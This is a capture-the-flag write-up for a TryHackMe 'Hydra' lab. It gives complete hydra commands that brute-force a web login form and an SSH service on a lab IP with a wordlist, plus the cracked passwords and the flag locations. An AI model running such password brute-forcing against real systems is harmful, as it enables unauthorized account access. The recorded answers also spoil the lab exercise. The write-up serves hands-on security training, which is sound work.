# THM ROOM Hydra

[THM Link](https://tryhackme.com/room/hydra?ref=anpho.github.io)

Since AttackBox has some strange behavior which made it very difficult to **hydra**, I used my WSL2/Kali + OpenVPN to finish this mission.

## step 1. gather infomation

From the question I can assume the login name is *molly* , by visiting the login page via **curl**, I know these information:

| key | value |
| --- | ----- |
|POST target | /login |
|username field | username |
|password field | password |
|FAIL text | .....is incorrect |

That's enough for hydra to bruteforce hack it.

## step 2. hack web

I'm new to hydra. After reading hydra's manpage I figured that I should obtain some *password.txt* as dictionary to hack, moments later I got [dirb](https://www.kali.org/tools/dirb/) , which provides some password dictionary.

```
hydra -l molly -P /usr/share/dirb/wordlists/others/best1050.txt 10.10.177.229 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
```

After some minutes:

```
[80][http-post-form] host: 10.10.177.229   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
```

## step 3. hack ssh

same hydra, but for ssh service.

```
hydra -l molly -P /usr/share/dirb/wordlists/others/best1050.txt 10.10.177.229 ssh
```

and the password is another one.

```
[22][ssh] host: 10.10.177.229   login: molly   password: butterfly
```

## step 4. get the flag

SSH flag2 is at user's home folder. which is very easy to find.

web flag1 is at index page, which also lies at ```/home/ubuntu/elf/views/index.ejs```, it's fun.
